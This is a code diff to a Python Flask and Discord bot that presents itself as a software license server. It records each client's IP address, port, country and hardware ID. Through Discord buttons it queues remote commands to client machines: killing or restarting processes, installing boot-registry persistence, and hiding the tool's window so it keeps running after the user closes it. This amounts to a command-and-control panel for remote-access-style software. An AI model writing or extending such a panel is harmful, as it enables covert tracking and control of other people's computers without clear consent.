@@ -23,62 +23,71 @@ def home():
 
 @app.route('/activate', methods=['POST'])
 def api_activate():
-    data = request.json
-    if not data: return {"status": "error", "message": "No data"}, 400
-    
-    user_code = data.get("code", "").strip().upper()
-    current_device = data.get("device", "").strip()
-    
-    if request.headers.get('X-Forwarded-For'):
-        client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
-    else:
-        client_ip = request.remote_addr
-        
-    client_port = str(request.environ.get('REMOTE_PORT', '7680'))
-    
-    client_country = "Unknown"
     try:
-        geo_res = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,country", timeout=3).json()
-        if geo_res.get('status') == 'success':
-            client_country = geo_res.get('country', 'Unknown')
-    except Exception:
-        pass
-
-    db, sha, url, headers = fetch_db()
-    if not db: return {"status": "error", "message": "Database error"}, 500
-
-    if user_code in db.get("blacklisted_codes", []) or current_device in db.get("blacklisted_devices", []):
-        return {"status": "error", "message": "Banned"}, 403
-
-    codes_dict = db.get("codes", {})
-    if user_code not in codes_dict:
-        return {"status": "error", "message": "Invalid code"}, 404
-
-    code_info = codes_dict[user_code]
-
-    if code_info["used"]:
-        if code_info["device"] == current_device:
-            code_info["last_seen"] = int(time.time())
-            save_db(db, sha, url, headers, f"Update heartbeat for {user_code}")
-            return {"status": "success", "message": "Already activated on this device"}
+        data = request.json
+        if not data: 
+            return {"status": "error", "message": "No data received"}, 400
+        
+        user_code = data.get("code", "").strip().upper()
+        current_device = data.get("device", "").strip()
+        
+        if request.headers.get('X-Forwarded-For'):
+            client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
         else:
-            return {"status": "error", "message": "Used on another device"}, 400
+            client_ip = request.remote_addr
+            
+        client_port = str(request.environ.get('REMOTE_PORT', '7680'))
+        
+        client_country = "Unknown"
+        try:
+            geo_res = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,country", timeout=2).json()
+            if geo_res.get('status') == 'success':
+                client_country = geo_res.get('country', 'Unknown')
+        except Exception:
+            pass
 
-    code_info["used"] = True
-    code_info["device"] = current_device
-    code_info["ip"] = client_ip
-    code_info["port"] = client_port
-    code_info["country"] = client_country
-    code_info["last_seen"] = int(time.time())
+        db, sha, url, headers = fetch_db()
+        if not db: 
+            return {"status": "error", "message": "تعذر الاتصال بقاعدة البيانات"}, 500
 
-    if save_db(db, sha, url, headers, f"Activate code {user_code} with real IP {client_ip}"):
-        asyncio.run_coroutine_threadsafe(
-            send_discord_activation_alert(user_code, current_device, client_ip, client_port, client_country),
-            client.loop
-        )
-        return {"status": "success", "ip": client_ip, "port": client_port, "country": client_country}
+        if user_code in db.get("blacklisted_codes", []) or current_device in db.get("blacklisted_devices", []):
+            return {"status": "error", "message": "هذا الكود أو الجهاز محظور"}, 403
 
-    return {"status": "error", "message": "Save failed"}, 500
+        codes_dict = db.get("codes", {})
+        if user_code not in codes_dict:
+            return {"status": "error", "message": "الكود المدخل غير صالح أو غير موجود"}, 404
+
+        code_info = codes_dict[user_code]
+
+        if code_info.get("used", False):
+            if code_info.get("device") == current_device:
+                code_info["last_seen"] = int(time.time())
+                save_db(db, sha, url, headers, f"Update heartbeat for {user_code}")
+                return {"status": "success", "message": "Already activated on this device"}
+            else:
+                return {"status": "error", "message": "الكود مستخدم بالفعل على جهاز آخر!"}, 400
+
+        code_info["used"] = True
+        code_info["device"] = current_device
+        code_info["ip"] = client_ip
+        code_info["port"] = client_port
+        code_info["country"] = client_country
+        code_info["last_seen"] = int(time.time())
+
+        if save_db(db, sha, url, headers, f"Activate code {user_code} with IP {client_ip}"):
+            try:
+                asyncio.run_coroutine_threadsafe(
+                    send_discord_activation_alert(user_code, current_device, client_ip, client_port, client_country),
+                    client.loop
+                )
+            except Exception:
+                pass
+            return {"status": "success", "ip": client_ip, "port": client_port, "country": client_country}
+
+        return {"status": "error", "message": "فشل حفظ بيانات التفعيل في السيرفر"}, 500
+        
+    except Exception as e:
+        return {"status": "error", "message": f"خطأ داخلي في السيرفر: {str(e)}"}, 500
 
 async def send_discord_activation_alert(user_code, current_device, client_ip, client_port, client_country):
     try:
@@ -196,131 +205,132 @@ class LicenseBot(discord.Client):
         if interaction.type == discord.InteractionType.component:
             custom_id = interaction.data.get("custom_id", "")
             
-            if custom_id.startswith(("ban_", "unban_", "recycle_", "kick_")):
-                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+            if not interaction.response.is_done():
+                await interaction.response.defer(thinking=True, ephemeral=True)
+
+            try:
+                if custom_id.startswith(("ban_", "unban_", "recycle_", "kick_")):
+                    try:
+                        action, encoded_data = custom_id.split("_", 1)
+                        raw_data = base64.urlsafe_b64decode(encoded_data + "=" * (-len(encoded_data) % 4)).decode("utf-8")
+                        user_code, current_device = raw_data.split(":", 1)
+                    except Exception:
+                        await interaction.followup.send("❌ فشل تحليل بيانات الزر.", ephemeral=True)
+                        return
+
+                    db, sha, url, headers = fetch_db()
+                    if not db: return
+
+                    if action == "ban":
+                        if "blacklisted_codes" not in db: db["blacklisted_codes"] = []
+                        if "blacklisted_devices" not in db: db["blacklisted_devices"] = []
+                        if user_code not in db["blacklisted_codes"]: db["blacklisted_codes"].append(user_code)
+                        if current_device and current_device not in db["blacklisted_devices"]: db["blacklisted_devices"].append(current_device)
+                        if user_code in db.get("codes", {}):
+                            db["codes"][user_code]["used"] = False
+                            db["codes"][user_code]["device"] = None
+                        if save_db(db, sha, url, headers, f"Ban {user_code}"):
+                            await interaction.followup.send(f"🚫 تم حظر الكود `{user_code}` والجهاز بنجاح!", ephemeral=True)
+
+                    elif action == "unban" or action == "recycle":
+                        if user_code in db.get("blacklisted_codes", []): db["blacklisted_codes"].remove(user_code)
+                        if current_device in db.get("blacklisted_devices", []): db["blacklisted_devices"].remove(current_device)
+                        if user_code in db.get("codes", {}):
+                            db["codes"][user_code]["used"] = False
+                            db["codes"][user_code]["device"] = None
+                        if save_db(db, sha, url, headers, f"Reset {user_code}"):
+                            await interaction.followup.send(f"♻️ تم رفع الحظر والتصفير للكود `{user_code}`!", ephemeral=True)
+
+                    elif action == "kick":
+                        if "targeted_kick_messages" not in db: db["targeted_kick_messages"] = {}
+                        db["targeted_kick_messages"][user_code] = {"msg": "تم طردك من المشرف", "id": str(int(time.time()))}
+                        if save_db(db, sha, url, headers, f"Kick {user_code}"):
+                            await interaction.followup.send(f"👢 تم إرسال أمر الطرد للعميل `{user_code}`!", ephemeral=True)
+
+                elif custom_id.startswith("del_Unused_"):
+                    code_to_del = custom_id.replace("del_Unused_", "")
+                    db, sha, url, headers = fetch_db()
+                    if db and code_to_del in db.get("codes", {}):
+                        del db["codes"][code_to_del]
+                        if save_db(db, sha, url, headers, f"Delete unused {code_to_del}"):
+                            await interaction.followup.send(f"🗑️ تم حذف الكود `{code_to_del}` نهائياً!", ephemeral=True)
+
+                elif custom_id.startswith("unban_code_"):
+                    code_to_unban = custom_id.replace("unban_code_", "")
+                    db, sha, url, headers = fetch_db()
+                    if db and code_to_unban in db.get("blacklisted_codes", []):
+                        db["blacklisted_codes"].remove(code_to_unban)
+                        if code_to_unban in db.get("codes", {}):
+                            db["codes"][code_to_unban]["used"] = False
+                            db["codes"][code_to_unban]["device"] = None
+                        if save_db(db, sha, url, headers, f"Unban {code_to_unban}"):
+                            await interaction.followup.send(f"♻️ تم رفع الحظر عن الكود `{code_to_unban}` بنجاح!", ephemeral=True)
+
+                elif custom_id == "refresh_devices_list":
+                    db, _, _, _ = fetch_db()
+                    if not db: return
+                    devs_list = [(c, info) for c, info in db.get("codes", {}).items() if info.get("used") and info.get("device")]
+                    try:
+                        await interaction.message.edit(content="🔄 **تم تحديث قائمة الأجهزة وحالة الاتصال بدقة فورية:**", view=DevicesSubMenuView(devs_list) if devs_list else None)
+                    except Exception:
+                        await interaction.followup.send("🔄 تم تحديث القائمة بنجاح!", ephemeral=True)
+
+                elif custom_id.startswith("man_dev_"):
+                    dev_code = custom_id.replace("man_dev_", "")
+                    db, _, _, _ = fetch_db()
+                    if db and dev_code in db.get("codes", {}):
+                        info = db["codes"][dev_code]
+                        ip = info.get("ip", "Unknown")
+                        port = info.get("port", "7680")
+                        country = info.get("country", "Unknown")
+                        hwid = info.get("device", "Unknown")
+                        last_seen = info.get("last_seen", 0)
+                        is_online = (time.time() - last_seen) < 20
+                        status_str = "🟢 متصل (Online)" if is_online else "🔴 غير متصل (Offline)"
+                        
+                        view = DeviceActionsView(dev_code, hwid, ip, port, country)
+                        await interaction.followup.send(
+                            f"⚙️ **لوحة التحكم بالعميل:**\n🔑 الكود: `{dev_code}`\nحالة الاتصال: **{status_str}**\n🌐 IP: `{ip}`\n🔌 Port: `{port}`\n🌍 الدولة: `{country}`\n🔒 HWID: `{hwid}`", 
+                            view=view, ephemeral=True
+                        )
+
+                elif custom_id.startswith("kill_p_"):
+                    _, _, dev_code, proc_name = custom_id.split("_", 3)
+                    db, sha, url, headers = fetch_db()
+                    if db:
+                        db.setdefault("remote_kill_process", {})[dev_code] = {"process_name": proc_name, "id": str(int(time.time()))}
+                        if save_db(db, sha, url, headers, f"Kill process {proc_name} for {dev_code}"):
+                            await interaction.followup.send(f"🛑 تم إرسال أمر إغلاق البرنامج `{proc_name}` بنجاح!", ephemeral=True)
+
+                elif custom_id.startswith("rest_p_"):
+                    _, _, dev_code, proc_name = custom_id.split("_", 3)
+                    db, sha, url, headers = fetch_db()
+                    if db:
+                        db.setdefault("remote_restart_process", {})[dev_code] = {"process_name": proc_name, "id": str(int(time.time()))}
+                        if save_db(db, sha, url, headers, f"Restart process {proc_name} for {dev_code}"):
+                            await interaction.followup.send(f"🔄 تم إرسال أمر تشغيل البرنامج `{proc_name}` بنجاح!", ephemeral=True)
+
+                elif custom_id.startswith("root_inst_"):
+                    dev_code = custom_id.replace("root_inst_", "")
+                    db, sha, url, headers = fetch_db()
+                    if db:
+                        db.setdefault("remote_root_installs", {})[dev_code] = {"action": "install", "id": str(int(time.time()))}
+                        if save_db(db, sha, url, headers, f"Install root persistence for {dev_code}"):
+                            await interaction.followup.send(f"🌱 **تم تثبيت الجذور وإضافتها لسجل الإقلاع للعميل (`{dev_code}`) بنجاح!**", ephemeral=True)
+
+                elif custom_id.startswith("root_rem_"):
+                    dev_code = custom_id.replace("root_rem_", "")
+                    db, sha, url, headers = fetch_db()
+                    if db:
+                        db.setdefault("remote_root_installs", {})[dev_code] = {"action": "remove", "id": str(int(time.time()))}
+                        if save_db(db, sha, url, headers, f"Remove root persistence for {dev_code}"):
+                            await interaction.followup.send(f"🗑️ **تم إزالة وحذف جذور الإقلاع من سجل النظام للعميل (`{dev_code}`) بنجاح!**", ephemeral=True)
+
+            except Exception as e:
                 try:
-                    action, encoded_data = custom_id.split("_", 1)
-                    raw_data = base64.urlsafe_b64decode(encoded_data + "=" * (-len(encoded_data) % 4)).decode("utf-8")
-                    user_code, current_device = raw_data.split(":", 1)
+                    await interaction.followup.send(f"❌ حدث خطأ: {str(e)}", ephemeral=True)
                 except Exception:
-                    await interaction.followup.send("❌ فشل تحليل بيانات الزر.", ephemeral=True)
-                    return
-
-                db, sha, url, headers = fetch_db()
-                if not db: return
-
-                if action == "ban":
-                    if "blacklisted_codes" not in db: db["blacklisted_codes"] = []
-                    if "blacklisted_devices" not in db: db["blacklisted_devices"] = []
-                    if user_code not in db["blacklisted_codes"]: db["blacklisted_codes"].append(user_code)
-                    if current_device and current_device not in db["blacklisted_devices"]: db["blacklisted_devices"].append(current_device)
-                    if user_code in db.get("codes", {}):
-                        db["codes"][user_code]["used"] = False
-                        db["codes"][user_code]["device"] = None
-                    if save_db(db, sha, url, headers, f"Ban {user_code}"):
-                        await interaction.followup.send(f"🚫 تم حظر الكود `{user_code}` والجهاز بنجاح!", ephemeral=True)
-
-                elif action == "unban" or action == "recycle":
-                    if user_code in db.get("blacklisted_codes", []): db["blacklisted_codes"].remove(user_code)
-                    if current_device in db.get("blacklisted_devices", []): db["blacklisted_devices"].remove(current_device)
-                    if user_code in db.get("codes", {}):
-                        db["codes"][user_code]["used"] = False
-                        db["codes"][user_code]["device"] = None
-                    if save_db(db, sha, url, headers, f"Reset {user_code}"):
-                        await interaction.followup.send(f"♻️ تم رفع الحظر والتصفير للكود `{user_code}`!", ephemeral=True)
-
-                elif action == "kick":
-                    if "targeted_kick_messages" not in db: db["targeted_kick_messages"] = {}
-                    db["targeted_kick_messages"][user_code] = {"msg": "تم طردك من المشرف", "id": str(int(time.time()))}
-                    if save_db(db, sha, url, headers, f"Kick {user_code}"):
-                        await interaction.followup.send(f"👢 تم إرسال أمر الطرد للعميل `{user_code}`!", ephemeral=True)
-
-            elif custom_id.startswith("del_Unused_"):
-                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-                code_to_del = custom_id.replace("del_Unused_", "")
-                db, sha, url, headers = fetch_db()
-                if db and code_to_del in db.get("codes", {}):
-                    del db["codes"][code_to_del]
-                    if save_db(db, sha, url, headers, f"Delete unused {code_to_del}"):
-                        await interaction.followup.send(f"🗑️ تم حذف الكود `{code_to_del}` نهائياً!", ephemeral=True)
-
-            elif custom_id.startswith("unban_code_"):
-                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-                code_to_unban = custom_id.replace("unban_code_", "")
-                db, sha, url, headers = fetch_db()
-                if db and code_to_unban in db.get("blacklisted_codes", []):
-                    db["blacklisted_codes"].remove(code_to_unban)
-                    if code_to_unban in db.get("codes", {}):
-                        db["codes"][code_to_unban]["used"] = False
-                        db["codes"][code_to_unban]["device"] = None
-                    if save_db(db, sha, url, headers, f"Unban {code_to_unban}"):
-                        await interaction.followup.send(f"♻️ تم رفع الحظر عن الكود `{code_to_unban}` بنجاح!", ephemeral=True)
-
-            elif custom_id == "refresh_devices_list":
-                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-                db, _, _, _ = fetch_db()
-                if not db: return
-                devs_list = [(c, info) for c, info in db.get("codes", {}).items() if info.get("used") and info.get("device")]
-                try:
-                    await interaction.message.edit(content="🔄 **تم تحديث قائمة الأجهزة وحالة الاتصال بدقة فورية:**", view=DevicesSubMenuView(devs_list) if devs_list else None)
-                except Exception:
-                    await interaction.followup.send("🔄 تم تحديث القائمة بنجاح!", ephemeral=True)
-
-            elif custom_id.startswith("man_dev_"):
-                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-                dev_code = custom_id.replace("man_dev_", "")
-                db, _, _, _ = fetch_db()
-                if db and dev_code in db.get("codes", {}):
-                    info = db["codes"][dev_code]
-                    ip = info.get("ip", "Unknown")
-                    port = info.get("port", "7680")
-                    country = info.get("country", "Unknown")
-                    hwid = info.get("device", "Unknown")
-                    last_seen = info.get("last_seen", 0)
-                    is_online = (time.time() - last_seen) < 20
-                    status_str = "🟢 متصل (Online)" if is_online else "🔴 غير متصل (Offline)"
-                    
-                    view = DeviceActionsView(dev_code, hwid, ip, port, country)
-                    await interaction.followup.send(
-                        f"⚙️ **لوحة التحكم بالعميل:**\n🔑 الكود: `{dev_code}`\nحالة الاتصال: **{status_str}**\n🌐 IP: `{ip}`\n🔌 Port: `{port}`\n🌍 الدولة: `{country}`\n🔒 HWID: `{hwid}`", 
-                        view=view, ephemeral=True
-                    )
-
-            elif custom_id.startswith("kill_p_"):
-                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-                _, _, dev_code, proc_name = custom_id.split("_", 3)
-                db, sha, url, headers = fetch_db()
-                if db:
-                    db.setdefault("remote_kill_process", {})[dev_code] = {"process_name": proc_name, "id": str(int(time.time()))}
-                    if save_db(db, sha, url, headers, f"Kill process {proc_name} for {dev_code}"):
-                        await interaction.followup.send(f"🛑 تم إرسال أمر إغلاق البرنامج `{proc_name}` بنجاح!", ephemeral=True)
-
-            elif custom_id.startswith("rest_p_"):
-                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-                _, _, dev_code, proc_name = custom_id.split("_", 3)
-                db, sha, url, headers = fetch_db()
-                if db:
-                    db.setdefault("remote_restart_process", {})[dev_code] = {"process_name": proc_name, "id": str(int(time.time()))}
-                    if save_db(db, sha, url, headers, f"Restart process {proc_name} for {dev_code}"):
-                        await interaction.followup.send(f"🔄 تم إرسال أمر تشغيل البرنامج `{proc_name}` بنجاح!", ephemeral=True)
-
-            elif custom_id.startswith("root_inst_"):
-                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-                dev_code = custom_id.replace("root_inst_", "")
-                db, sha, url, headers = fetch_db()
-                if db:
-                    db.setdefault("remote_root_installs", {})[dev_code] = {"action": "install", "id": str(int(time.time()))}
-                    if save_db(db, sha, url, headers, f"Install root persistence for {dev_code}"):
-                        await interaction.followup.send(f"🌱 **تم تثبيت الجذور وإضافتها لسجل الإقلاع للعميل (`{dev_code}`) بنجاح!**", ephemeral=True)
-
-            elif custom_id.startswith("root_rem_"):
-                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-                dev_code = custom_id.replace("root_rem_", "")
-                db, sha, url, headers = fetch_db()
-                if db:
-                    db.setdefault("remote_root_installs", {})[dev_code] = {"action": "remove", "id": str(int(time.time()))}
-                    if save_db(db, sha, url, headers, f"Remove root persistence for {dev_code}"):
-                        await interaction.followup.send(f"🗑️ **تم إزالة وحذف جذور الإقلاع من سجل النظام للعميل (`{dev_code}`) بنجاح!**", ephemeral=True)
+                    pass
 
 client = LicenseBot()
 
@@ -444,7 +454,8 @@ class DeviceActionsView(discord.ui.View):
         db, sha, url, headers = fetch_db()
         if db:
             db.setdefault("remote_lock_states", {})[self.code] = {"locked": True, "id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Lock {self.code}"): await interaction.followup.send("🛡️ تم تفعيل الثبات الجذري وإخفاء النافذة!", ephemeral=True)
+            if save_db(db, sha, url, headers, f"Lock {self.code}"): 
+                await interaction.followup.send("🛡️ تم تفعيل الثبات الجذري وإخفاء النافذة للعميل، وستستمر الأداة بالعمل في الخلفية حتى عند إغلاق الواجهة بـ (X)!", ephemeral=True)
 
     @discord.ui.button(label="🔓 إلغاء الثبات (إظهار)", style=discord.ButtonStyle.secondary, custom_id="dev_act_unlock_app", row=3)
     async def unlock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -453,7 +464,8 @@ class DeviceActionsView(discord.ui.View):
         if db:
             if "remote_lock_states" in db and self.code in db["remote_lock_states"]:
                 del db["remote_lock_states"][self.code]
-            if save_db(db, sha, url, headers, f"Unlock {self.code}"): await interaction.followup.send("🔓 تم إلغاء الثبات وإظهار النافذة!", ephemeral=True)
+            if save_db(db, sha, url, headers, f"Unlock {self.code}"): 
+                await interaction.followup.send("🔓 تم إلغاء الثبات وإعادة النافذة للوضع الطبيعي وإظهارها!", ephemeral=True)
 
     @discord.ui.button(label="🛑 إطفاء الأداة", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=4)
     async def kill_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
